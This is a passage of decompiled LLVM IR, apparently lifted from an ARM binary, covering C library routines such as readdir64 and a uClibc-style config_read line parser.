  %v1_172fc = add i32 %v0_172fc, 64
  %v1_17300 = inttoptr i32 %v1_172fc to i32*
  store i32 %v2_172f8, i32* %v1_17300, align 4
  %v3_17300 = add i32 %v0_172fc, 68
  %v4_17300 = inttoptr i32 %v3_17300 to i32*
  %v5_17300 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17300, i32* %v4_17300, align 4
  %v0_17304 = load i32, i32* %r5.global-to-local, align 4
  %v1_17304 = add i32 %v0_17304, 16
  %v2_17304 = inttoptr i32 %v1_17304 to i32*
  %v3_17304 = load i32, i32* %v2_17304, align 4
  %v1_17308 = load i32, i32* %r6.global-to-local, align 4
  %v2_17308 = add i32 %v1_17308, 16
  %v3_17308 = inttoptr i32 %v2_17308 to i32*
  store i32 %v3_17304, i32* %v3_17308, align 4
  %v0_1730c = load i32, i32* %r5.global-to-local, align 4
  %v1_1730c = add i32 %v0_1730c, 88
  %v1_17310 = add i32 %v0_1730c, 20
  %v2_17310 = inttoptr i32 %v1_17310 to i32*
  %v3_17310 = load i32, i32* %v2_17310, align 4
  store i32 %v3_17310, i32* %r2.global-to-local, align 4
  %v1_17314 = inttoptr i32 %v1_1730c to i32*
  %v2_17314 = load i32, i32* %v1_17314, align 4
  %v3_17314 = add i32 %v0_1730c, 92
  %v4_17314 = inttoptr i32 %v3_17314 to i32*
  %v5_17314 = load i32, i32* %v4_17314, align 4
  store i32 %v5_17314, i32* %r1.global-to-local, align 4
  %v0_17318 = load i32, i32* %r6.global-to-local, align 4
  %v1_17318 = add i32 %v0_17318, 72
  %v1_1731c = inttoptr i32 %v1_17318 to i32*
  store i32 %v2_17314, i32* %v1_1731c, align 4
  %v3_1731c = add i32 %v0_17318, 76
  %v4_1731c = inttoptr i32 %v3_1731c to i32*
  %v5_1731c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1731c, i32* %v4_1731c, align 4
  %v0_17320 = load i32, i32* %r2.global-to-local, align 4
  %v1_17320 = load i32, i32* %r6.global-to-local, align 4
  %v2_17320 = add i32 %v1_17320, 20
  %v3_17320 = inttoptr i32 %v2_17320 to i32*
  store i32 %v0_17320, i32* %v3_17320, align 4
  %v0_17324 = load i32, i32* %ip.global-to-local, align 4
  %v1_17324 = load i32, i32* %r6.global-to-local, align 4
  %v2_17324 = add i32 %v1_17324, 24
  %v3_17324 = inttoptr i32 %v2_17324 to i32*
  store i32 %v0_17324, i32* %v3_17324, align 4
  %v0_17328 = load i32, i32* %lr.global-to-local, align 4
  %v1_17328 = load i32, i32* %r6.global-to-local, align 4
  %v2_17328 = add i32 %v1_17328, 28
  %v3_17328 = inttoptr i32 %v2_17328 to i32*
  store i32 %v0_17328, i32* %v3_17328, align 4
  %v2_1732c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1732c, i32* %r4.global-to-local, align 4
  ret i32 %v2_17314

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 4, 2, 3, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r6, align 4
  %v1_17348 = add i32 %tmp, 24
  store i32 %v1_17348, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_17360 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 112) to i32*), align 4
  store i32 %v4_17360, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_17360)
  %v0_17374 = load i32, i32* @r6, align 4
  %v2_17374 = add i32 %v0_17374, 16
  %v3_17374 = inttoptr i32 %v2_17374 to i32*
  %v4_17374 = load i32, i32* %v3_17374, align 4
  store i32 %v4_17374, i32* %ip.global-to-local, align 4
  store i32 95104, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17374)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_17384

dec_label_pc_17384:                               ; preds = %dec_label_pc_173b4, %entry
  %v0_17384 = load i32, i32* @r5, align 4
  %v1_17384 = add i32 %v0_17384, 4
  %v2_17384 = inttoptr i32 %v1_17384 to i32*
  %v3_17384 = load i32, i32* %v2_17384, align 4
  %v4_17384 = add i32 %v0_17384, 8
  %v5_17384 = inttoptr i32 %v4_17384 to i32*
  %v6_17384 = load i32, i32* %v5_17384, align 4
  %tmp10 = icmp ugt i32 %v6_17384, %v3_17384
  br i1 %tmp10, label %dec_label_pc_173b4, label %dec_label_pc_17390

dec_label_pc_17390:                               ; preds = %dec_label_pc_17384
  %v1_17390 = inttoptr i32 %v0_17384 to i32*
  %v2_17390 = load i32, i32* %v1_17390, align 4
  %v1_17394 = add i32 %v0_17384, 12
  %v2_17394 = inttoptr i32 %v1_17394 to i32*
  %v3_17394 = load i32, i32* %v2_17394, align 4
  %v1_17398 = add i32 %v0_17384, 20
  %v2_17398 = inttoptr i32 %v1_17398 to i32*
  %v3_17398 = load i32, i32* %v2_17398, align 4
  %v4_1739c = inttoptr i32 %v3_17394 to i32*
  %v5_1739c = call i32 @__getdents64(i32 %v2_17390, i32* %v4_1739c, i32 %v3_17398, i32 %v6_17384)
  %tmp9 = icmp slt i32 %v5_1739c, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_173ac

.thread:                                          ; preds = %dec_label_pc_17390
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_173e4

dec_label_pc_173ac:                               ; preds = %dec_label_pc_17390
  %v1_173ac = load i32, i32* @r5, align 4
  %v2_173ac = add i32 %v1_173ac, 8
  %v3_173ac = inttoptr i32 %v2_173ac to i32*
  store i32 %v5_1739c, i32* %v3_173ac, align 4
  %v0_173b0 = load i32, i32* @r7, align 4
  %v1_173b0 = load i32, i32* @r5, align 4
  %v2_173b0 = add i32 %v1_173b0, 4
  %v3_173b0 = inttoptr i32 %v2_173b0 to i32*
  store i32 %v0_173b0, i32* %v3_173b0, align 4
  %v0_173b4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_173b4

dec_label_pc_173b4:                               ; preds = %dec_label_pc_17384, %dec_label_pc_173ac
  %v1_173d8 = phi i32 [ %v0_17384, %dec_label_pc_17384 ], [ %v0_173b4.pre, %dec_label_pc_173ac ]
  %v1_173b4 = add i32 %v1_173d8, 4
  %v2_173b4 = inttoptr i32 %v1_173b4 to i32*
  %v3_173b4 = load i32, i32* %v2_173b4, align 4
  %v1_173b8 = add i32 %v1_173d8, 12
  %v2_173b8 = inttoptr i32 %v1_173b8 to i32*
  %v3_173b8 = load i32, i32* %v2_173b8, align 4
  %v2_173bc = add i32 %v3_173b8, %v3_173b4
  store i32 %v2_173bc, i32* @r4, align 4
  %v3_173c0 = inttoptr i32 %v2_173bc to i32*
  %v4_173c0 = load i32, i32* %v3_173c0, align 4
  %v1_173c4 = add i32 %v2_173bc, 4
  %v2_173c4 = inttoptr i32 %v1_173c4 to i32*
  %v3_173c4 = load i32, i32* %v2_173c4, align 4
  %v1_173c8 = add i32 %v2_173bc, 16
  %v2_173c8 = inttoptr i32 %v1_173c8 to i16*
  %v3_173c8 = load i16, i16* %v2_173c8, align 2
  %v4_173c8 = zext i16 %v3_173c8 to i32
  %v1_173cc = add i32 %v2_173bc, 8
  %v2_173cc = inttoptr i32 %v1_173cc to i32*
  %v3_173cc = load i32, i32* %v2_173cc, align 4
  store i32 %v3_173cc, i32* %ip.global-to-local, align 4
  %v2_173d0 = add i32 %v4_173c8, %v3_173b4
  %v2_173d4 = or i32 %v3_173c4, %v4_173c0
  %v4_173d4 = icmp eq i32 %v2_173d4, 0
  store i32 %v2_173d0, i32* %v2_173b4, align 4
  %v0_173dc = load i32, i32* %ip.global-to-local, align 4
  %v1_173dc = load i32, i32* @r5, align 4
  %v2_173dc = add i32 %v1_173dc, 16
  %v3_173dc = inttoptr i32 %v2_173dc to i32*
  store i32 %v0_173dc, i32* %v3_173dc, align 4
  br i1 %v4_173d4, label %dec_label_pc_17384, label %dec_label_pc_173e4

dec_label_pc_173e4:                               ; preds = %dec_label_pc_173b4, %.thread
  %v0_173f0 = load i32, i32* @r6, align 4
  %v2_173f0 = add i32 %v0_173f0, 44
  %v3_173f0 = inttoptr i32 %v2_173f0 to i32*
  %v4_173f0 = load i32, i32* %v3_173f0, align 4
  store i32 %v4_173f0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_173f0)
  %v0_173fc = load i32, i32* @r4, align 4
  ret i32 %v0_173fc

; uselistorder directives
  uselistorder i32 %v2_173bc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_173d8, { 1, 0 }
  uselistorder i32 %v6_17384, { 1, 0 }
  uselistorder i32 %v0_17384, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_173b4, { 1, 0 }
}

define i32 @function_17410(i32 %arg1) local_unnamed_addr {
dec_label_pc_17410:
  %v0_17410 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17410, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_17410
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17410, %bb
  %v4_1741c = phi i32 [ %arg1, %dec_label_pc_17410 ], [ 0, %bb ]
  ret i32 %v4_1741c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_17420 = load i32, i32* @r4, align 4
  %v6_17420 = load i32, i32* @r5, align 4
  %v9_17420 = load i32, i32* @r6, align 4
  %v12_17420 = load i32, i32* @r7, align 4
  %v15_17420 = load i32, i32* @r8, align 4
  %v18_17420 = load i32, i32* @sb, align 4
  %v21_17420 = load i32, i32* @sl, align 4
  %v24_17420 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_17424 = icmp eq i32* %arg1, null
  store i1 %v2_17424, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_17424, label %dec_label_pc_17734, label %dec_label_pc_1743c

dec_label_pc_1743c:                               ; preds = %entry
  %v1_1743c = urem i32 %arg3, 256
  store i32 %v1_1743c, i32* @sb, align 4
  %v1_17440 = udiv i32 %arg3, 256
  %v3_17444 = urem i32 %v1_17440, 256
  %v3_17448 = mul nuw nsw i32 %v1_1743c, 4
  %v1_17450 = or i32 %v3_17448, 1
  %v1_1745c = and i32 %arg3, 131072
  %v1_17460 = add nsw i32 %v1_1743c, -1
  %v1_1746c = and i32 %arg3, 262144
  store i32 %v1_1746c, i32* %r2.global-to-local, align 4
  %v1_17470 = and i32 %arg3, 65536
  store i32 %v1_17470, i32* %r3.global-to-local, align 4
  store i32 %v1_17470, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_17480 = add i32 %arg4, 1
  store i32 %v1_17480, i32* @sl, align 4
  %v2_175f8 = icmp eq i32 %v1_1745c, 0
  %v1_17650 = inttoptr i32 %arg2 to i32*
  %v2_17668 = icmp eq i32 %v1_1746c, 0
  br label %dec_label_pc_17484

dec_label_pc_17484:                               ; preds = %dec_label_pc_17484.backedge, %dec_label_pc_1743c
  %v2_174a0 = phi i32 [ %v0_17484.pre, %dec_label_pc_17484.backedge ], [ %tmp, %dec_label_pc_1743c ]
  %v1_17484 = add i32 %v2_174a0, 4
  %v2_17484 = inttoptr i32 %v1_17484 to i32*
  %v3_17484 = load i32, i32* %v2_17484, align 4
  store i32 %v3_17484, i32* %r3.global-to-local, align 4
  %v2_17488 = icmp eq i32 %v3_17484, 0
  store i1 %v2_17488, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17488, label %dec_label_pc_17490, label %dec_label_pc_174d8

dec_label_pc_17490:                               ; preds = %dec_label_pc_17484
  %v1_17490 = add i32 %v2_174a0, 16
  %v2_17490 = inttoptr i32 %v1_17490 to i32*
  %v3_17490 = load i32, i32* %v2_17490, align 4
  store i32 %v3_17490, i32* %r3.global-to-local, align 4
  %v2_17494 = icmp eq i32 %v3_17490, 0
  store i1 %v2_17494, i1* %cpsr_z.global-to-local, align 1
  %v1_17498 = add i32 %v2_174a0, 8
  %v2_17498 = inttoptr i32 %v1_17498 to i32*
  %v3_17498 = load i32, i32* %v2_17498, align 4
  store i32 %v3_17498, i32* %r3.global-to-local, align 4
  br i1 %v2_17494, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_17490
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_17490, align 4
  %v0_174a4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_17490, %bb
  %v0_174a4 = phi i32 [ %v0_174a4.pre, %bb ], [ %v3_17498, %dec_label_pc_17490 ]
  %v2_174a4 = icmp eq i32 %v0_174a4, 0
  store i1 %v2_174a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_174a4, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_17450, i32* %r3.global-to-local, align 4
  %v2_174ac = load i32, i32* @r5, align 4
  %v3_174ac = add i32 %v2_174ac, 8
  %v4_174ac = inttoptr i32 %v3_174ac to i32*
  store i32 %v1_17450, i32* %v4_174ac, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_174b0 = load i32, i32* @r5, align 4
  %v1_174b0 = add i32 %v0_174b0, 16
  %v2_174b0 = inttoptr i32 %v1_174b0 to i32*
  %v3_174b0 = load i32, i32* %v2_174b0, align 4
  store i32 %v3_174b0, i32* %r0.global-to-local, align 4
  %v1_174b4 = add i32 %v0_174b0, 8
  %v2_174b4 = inttoptr i32 %v1_174b4 to i32*
  %v3_174b4 = load i32, i32* %v2_174b4, align 4
  store i32 %v3_174b4, i32* %r3.global-to-local, align 4
  %v2_174b8 = add i32 %v3_174b4, %v3_174b0
  store i32 %v2_174b8, i32* @r0, align 4
  %v0_174bc = call i32 @malloc()
  store i32 %v0_174bc, i32* %r0.global-to-local, align 4
  %v2_174c0 = icmp eq i32 %v0_174bc, 0
  store i1 %v2_174c0, i1* %cpsr_z.global-to-local, align 1
  %v1_174c4 = load i32, i32* @r5, align 4
  %v2_174c4 = add i32 %v1_174c4, 4
  %v3_174c4 = inttoptr i32 %v2_174c4 to i32*
  store i32 %v0_174bc, i32* %v3_174c4, align 4
  br i1 %v2_174c0, label %dec_label_pc_17734, label %dec_label_pc_174cc

dec_label_pc_174cc:                               ; preds = %.thread
  %v0_174cc = load i32, i32* @r5, align 4
  %v1_174cc = add i32 %v0_174cc, 20
  %v2_174cc = inttoptr i32 %v1_174cc to i32*
  %v3_174cc = load i32, i32* %v2_174cc, align 4
  %v1_174d0 = or i32 %v3_174cc, 1
  store i32 %v1_174d0, i32* %r3.global-to-local, align 4
  store i32 %v1_174d0, i32* %v2_174cc, align 4
  %v0_174d8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_174d8

dec_label_pc_174d8:                               ; preds = %dec_label_pc_17484, %dec_label_pc_174cc
  %v1_174e0 = phi i32 [ %v2_174a0, %dec_label_pc_17484 ], [ %v0_174d8.pre, %dec_label_pc_174cc ]
  %v1_174d8 = add i32 %v1_174e0, 4
  %v2_174d8 = inttoptr i32 %v1_174d8 to i32*
  %v3_174d8 = load i32, i32* %v2_174d8, align 4
  store i32 %v3_174d8, i32* %r2.global-to-local, align 4
  %v4_174d8 = add i32 %v1_174e0, 8
  %v5_174d8 = inttoptr i32 %v4_174d8 to i32*
  %v6_174d8 = load i32, i32* %v5_174d8, align 4
  %v2_174dc = add i32 %v6_174d8, %v3_174d8
  store i32 %v2_174dc, i32* %r3.global-to-local, align 4
  %v2_174e0 = add i32 %v1_174e0, 12
  %v3_174e0 = inttoptr i32 %v2_174e0 to i32*
  store i32 %v2_174dc, i32* %v3_174e0, align 4
  %v0_174e4 = load i32, i32* @fp, align 4
  store i32 %v0_174e4, i32* @r6, align 4
  br label %dec_label_pc_174e8

dec_label_pc_174e8:                               ; preds = %dec_label_pc_17574, %dec_label_pc_17560, %dec_label_pc_174d8
  %v0_174f0 = phi i32 [ %v0_174e4, %dec_label_pc_174d8 ], [ %v1_17560, %dec_label_pc_17560 ], [ %v0_174f0.pre.pre, %dec_label_pc_17574 ]
  %v0_174e8 = load i32, i32* @r5, align 4
  %v1_174e8 = add i32 %v0_174e8, 12
  store i32 %v1_174e8, i32* %r0.global-to-local, align 4
  %v1_174ec = inttoptr i32 %v1_174e8 to i32*
  %v2_174ec = load i32, i32* %v1_174ec, align 4
  store i32 %v2_174ec, i32* %r0.global-to-local, align 4
  %v3_174ec = add i32 %v0_174e8, 16
  %v4_174ec = inttoptr i32 %v3_174ec to i32*
  %v5_174ec = load i32, i32* %v4_174ec, align 4
  %v2_174f0 = add i32 %v2_174ec, %v0_174f0
  store i32 %v2_174f0, i32* %r0.global-to-local, align 4
  %v2_174f4 = sub i32 %v5_174ec, %v0_174f0
  %v1_174f8 = inttoptr i32 %v0_174e8 to i32*
  %v2_174f8 = load i32, i32* %v1_174f8, align 4
  store i32 %v2_174f8, i32* %r2.global-to-local, align 4
  %v3_174fc = call i32 @fgets(i32 %v2_174f0, i32 %v2_174f4, i32 %v2_174f8)
  store i32 %v3_174fc, i32* %r0.global-to-local, align 4
  store i32 %v3_174fc, i32* %r4.global-to-local, align 4
  %v2_17500 = icmp eq i32 %v3_174fc, 0
  store i1 %v2_17500, i1* %cpsr_z.global-to-local, align 1
  %v0_17508 = load i32, i32* @r5, align 4
  %v1_17508 = add i32 %v0_17508, 12
  br i1 %v2_17500, label %dec_label_pc_17508, label %dec_label_pc_17520

dec_label_pc_17508:                               ; preds = %dec_label_pc_174e8
  store i32 %v1_17508, i32* %r0.global-to-local, align 4
  %v1_1750c = inttoptr i32 %v1_17508 to i32*
  %v2_1750c = load i32, i32* %v1_1750c, align 4
  store i32 %v2_1750c, i32* %r0.global-to-local, align 4
  %v3_1750c = add i32 %v0_17508, 16
  %v4_1750c = inttoptr i32 %v3_1750c to i32*
  %v5_1750c = load i32, i32* %v4_1750c, align 4
  store i32 %v5_1750c, i32* %r2.global-to-local, align 4
  %v3_17514 = inttoptr i32 %v2_1750c to i8*
  %v4_17514 = call i32 @__GI_memset(i8* %v3_17514, i32 0, i32 %v5_1750c)
  store i32 %v4_17514, i32* %r0.global-to-local, align 4
  %v0_17518 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17738

dec_label_pc_17520:                               ; preds = %dec_label_pc_174e8
  %v2_17520 = inttoptr i32 %v1_17508 to i32*
  %v3_17520 = load i32, i32* %v2_17520, align 4
  store i32 %v3_17520, i32* @r4, align 4
  %v1_17524 = load i32, i32* @r6, align 4
  %v2_17524 = add i32 %v1_17524, %v3_17520
  %v3_17524 = inttoptr i32 %v2_17524 to i8*
  store i32 %v2_17524, i32* %r0.global-to-local, align 4
  %v3_17528 = call i32 @strlen(i8* %v3_17524)
  %v0_17530 = load i32, i32* @r6, align 4
  %v2_17530 = add i32 %v0_17530, %v3_17528
  store i32 %v2_17530, i32* @r6, align 4
  %v0_17534 = load i32, i32* @r4, align 4
  store i32 %v0_17534, i32* @r0, align 4
  %v2_17538 = call i32 @__GI_strchr(i32 %v0_17534, i32 10)
  store i32 %v2_17538, i32* %r0.global-to-local, align 4
  %v2_1753c = icmp eq i32 %v2_17538, 0
  store i1 %v2_1753c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1753c, label %dec_label_pc_17568, label %dec_label_pc_17544

dec_label_pc_17544:                               ; preds = %dec_label_pc_17520
  %v1_17544 = inttoptr i32 %v2_17538 to i8*
  %v2_17544 = load i8, i8* %v1_17544, align 1
  %v3_17544 = zext i8 %v2_17544 to i32
  %v1_17548 = add nuw nsw i32 %v3_17544, 255
  %v1_1754c = urem i32 %v1_17548, 256
  store i32 %v1_1754c, i32* %r3.global-to-local, align 4
  %v7_17550 = icmp eq i32 %v1_1754c, 92
  store i1 %v7_17550, i1* %cpsr_z.global-to-local, align 1
  %v1_17554 = trunc i32 %v1_17548 to i8
  store i8 %v1_17554, i8* %v1_17544, align 1
  %v0_17558 = load i32, i32* @r6, align 4
  %v1_17558 = add i32 %v0_17558, -1
  store i32 %v1_17558, i32* @r6, align 4
  %v0_1755c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1755c, label %dec_label_pc_17560, label %dec_label_pc_175ec

dec_label_pc_17560:                               ; preds = %dec_label_pc_17544
  %v1_17560 = add i32 %v0_17558, -2
  store i32 %v1_17560, i32* @r6, align 4
  br label %dec_label_pc_174e8

dec_label_pc_17568:                               ; preds = %dec_label_pc_17520
  %v0_17568 = load i32, i32* @r5, align 4
  %v1_17568 = add i32 %v0_17568, 20
  %v2_17568 = inttoptr i32 %v1_17568 to i32*
  %v3_17568 = load i32, i32* %v2_17568, align 4
  store i32 %v3_17568, i32* %r3.global-to-local, align 4
  %v2_1756c = icmp eq i32 %v3_17568, 0
  store i1 %v2_1756c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1756c, label %dec_label_pc_175a4, label %dec_label_pc_17574

dec_label_pc_17574:                               ; preds = %dec_label_pc_17568
  %v1_17574 = add i32 %v0_17568, 16
  %v2_17574 = inttoptr i32 %v1_17574 to i32*
  %v3_17574 = load i32, i32* %v2_17574, align 4
  store i32 %v3_17574, i32* %r3.global-to-local, align 4
  %v1_17578 = add i32 %v0_17568, 8
  %v2_17578 = inttoptr i32 %v1_17578 to i32*
  %v3_17578 = load i32, i32* %v2_17578, align 4
  %v1_1757c = add i32 %v3_17574, 4096
  store i32 %v1_1757c, i32* %r3.global-to-local, align 4
  %v2_17580 = add i32 %v3_17578, %v1_1757c
  store i32 %v1_1757c, i32* %v2_17574, align 4
  %v0_17588 = load i32, i32* @r5, align 4
  %v1_17588 = add i32 %v0_17588, 4
  %v2_17588 = inttoptr i32 %v1_17588 to i32*
  %v3_17588 = load i32, i32* %v2_17588, align 4
  store i32 %v3_17588, i32* %r0.global-to-local, align 4
  %v4_1758c = inttoptr i32 %v3_17588 to i32*
  %v5_1758c = call i32 @realloc(i32* %v4_1758c, i32 %v2_17580, i32 %v2_174f8, i32 %v1_1757c)
  store i32 %v5_1758c, i32* %r0.global-to-local, align 4
  %v0_17590 = load i32, i32* @r5, align 4
  %v1_17590 = add i32 %v0_17590, 8
  %v2_17590 = inttoptr i32 %v1_17590 to i32*
  %v3_17590 = load i32, i32* %v2_17590, align 4
  %v2_17594 = add i32 %v3_17590, %v5_1758c
  store i32 %v2_17594, i32* %r3.global-to-local, align 4
  %v2_17598 = add i32 %v0_17590, 12
  %v3_17598 = inttoptr i32 %v2_17598 to i32*
  store i32 %v2_17594, i32* %v3_17598, align 4
  %v1_1759c = load i32, i32* @r5, align 4
  %v2_1759c = add i32 %v1_1759c, 4
  %v3_1759c = inttoptr i32 %v2_1759c to i32*
  store i32 %v5_1758c, i32* %v3_1759c, align 4
  %v0_174f0.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_174e8

dec_label_pc_175a4:                               ; preds = %dec_label_pc_17568, %.dec_label_pc_175a4_crit_edge
  %v0_175a4 = phi i32 [ %v0_175a4.pre, %.dec_label_pc_175a4_crit_edge ], [ %v0_17568, %dec_label_pc_17568 ]
  %v1_175a4 = inttoptr i32 %v0_175a4 to i32*
  %v2_175a4 = load i32, i32* %v1_175a4, align 4
  store i32 %v2_175a4, i32* @r1, align 4
  %v1_175a8 = add i32 %v2_175a4, 52
  %v2_175a8 = inttoptr i32 %v1_175a8 to i32*
  %v3_175a8 = load i32, i32* %v2_175a8, align 4
  store i32 %v3_175a8, i32* %r3.global-to-local, align 4
  %v2_175ac = icmp eq i32 %v3_175a8, 0
  store i1 %v2_175ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_175ac, label %dec_label_pc_175d8, label %dec_label_pc_175b4

dec_label_pc_175b4:                               ; preds = %dec_label_pc_175a4
  %v1_175b4 = add i32 %v2_175a4, 16
  %v2_175b4 = inttoptr i32 %v1_175b4 to i32*
  %v3_175b4 = load i32, i32* %v2_175b4, align 4
  store i32 %v3_175b4, i32* %r2.global-to-local, align 4
  %v1_175b8 = add i32 %v2_175a4, 24
  %v2_175b8 = inttoptr i32 %v1_175b8 to i32*
  %v3_175b8 = load i32, i32* %v2_175b8, align 4
  store i32 %v3_175b8, i32* %r3.global-to-local, align 4
  %v3_175bc = icmp ult i32 %v3_175b4, %v3_175b8
  %v9_175bc = icmp eq i32 %v3_175b4, %v3_175b8
  store i1 %v9_175bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_175bc, label %dec_label_pc_175e0thread-pre-split, label %dec_label_pc_175cc

dec_label_pc_175cc:                               ; preds = %dec_label_pc_175b4
  store i32 %v2_175a4, i32* %r0.global-to-local, align 4
  %v1_175d0 = inttoptr i32 %v2_175a4 to i16*
  %v2_175d0 = call i32 @getc_unlocked(i16* %v1_175d0)
  store i32 %v2_175d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_175e0

dec_label_pc_175d8:                               ; preds = %dec_label_pc_175a4
  store i32 %v2_175a4, i32* %r0.global-to-local, align 4
  %v1_175dc = call i32 @__GI_fgetc(i32 %v2_175a4)
  store i32 %v1_175dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_175e0

dec_label_pc_175e0thread-pre-split:               ; preds = %dec_label_pc_175b4
  %v2_175c0 = inttoptr i32 %v3_175b4 to i8*
  %v3_175c0 = load i8, i8* %v2_175c0, align 1
  %v4_175c0 = zext i8 %v3_175c0 to i32
  store i32 %v4_175c0, i32* %r0.global-to-local, align 4
  %v6_175c0 = add i32 %v3_175b4, 1
  store i32 %v6_175c0, i32* %r2.global-to-local, align 4
  store i32 %v6_175c0, i32* %v2_175b4, align 4
  %v0_175e0.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_175e0

dec_label_pc_175e0:                               ; preds = %dec_label_pc_175e0thread-pre-split, %dec_label_pc_175cc, %dec_label_pc_175d8
  %v1_175e4 = phi i32 [ %v0_175e0.pr, %dec_label_pc_175e0thread-pre-split ], [ %v2_175d0, %dec_label_pc_175cc ], [ %v1_175dc, %dec_label_pc_175d8 ]
  %v7_175e0 = icmp eq i32 %v1_175e4, 10
  store i1 %v7_175e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_175e0, label %dec_label_pc_175ec.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_175e0
  %v8_175e4 = icmp eq i32 %v1_175e4, -1
  store i1 %v8_175e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_175e4, label %dec_label_pc_175ec.loopexit, label %.dec_label_pc_175a4_crit_edge

.dec_label_pc_175a4_crit_edge:                    ; preds = %bb66
  %v0_175a4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_175a4

dec_label_pc_175ec.loopexit:                      ; preds = %bb66, %dec_label_pc_175e0
  %v0_175ec.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_175ec

dec_label_pc_175ec:                               ; preds = %dec_label_pc_17544, %dec_label_pc_175ec.loopexit
  %v0_175ec = phi i32 [ %v0_175ec.pre, %dec_label_pc_175ec.loopexit ], [ %v1_17558, %dec_label_pc_17544 ]
  %v7_175ec = icmp eq i32 %v0_175ec, -1
  store i1 %v7_175ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_175ec, label %dec_label_pc_17734, label %dec_label_pc_175f4

dec_label_pc_175f4:                               ; preds = %dec_label_pc_175ec
  store i32 %v1_1745c, i32* %r3.global-to-local, align 4
  store i1 %v2_175f8, i1* %cpsr_z.global-to-local, align 1
  %v0_175fc = load i32, i32* @r5, align 4
  %v1_175fc = add i32 %v0_175fc, 12
  %v2_175fc = inttoptr i32 %v1_175fc to i32*
  %v3_175fc = load i32, i32* %v2_175fc, align 4
  store i32 %v3_175fc, i32* @r4, align 4
  br i1 %v2_175f8, label %dec_label_pc_17614, label %dec_label_pc_17604

dec_label_pc_17604:                               ; preds = %dec_label_pc_175f4
  store i32 %v3_175fc, i32* @r0, align 4
  %v0_17608 = load i32, i32* @sl, align 4
  %v2_1760c = inttoptr i32 %v3_175fc to i8*
  %v3_1760c = call i32 @__GI_strspn(i8* %v2_1760c, i32 %v0_17608)
  store i32 %v3_1760c, i32* %r0.global-to-local, align 4
  %v0_17610 = load i32, i32* @r4, align 4
  %v2_17610 = add i32 %v0_17610, %v3_1760c
  store i32 %v2_17610, i32* @r4, align 4
  br label %dec_label_pc_17614

dec_label_pc_17614:                               ; preds = %dec_label_pc_175f4, %dec_label_pc_17604
  %v0_17614 = phi i32 [ %v3_175fc, %dec_label_pc_175f4 ], [ %v2_17610, %dec_label_pc_17604 ]
  %v1_17614 = inttoptr i32 %v0_17614 to i8*
  %v2_17614 = load i8, i8* %v1_17614, align 1
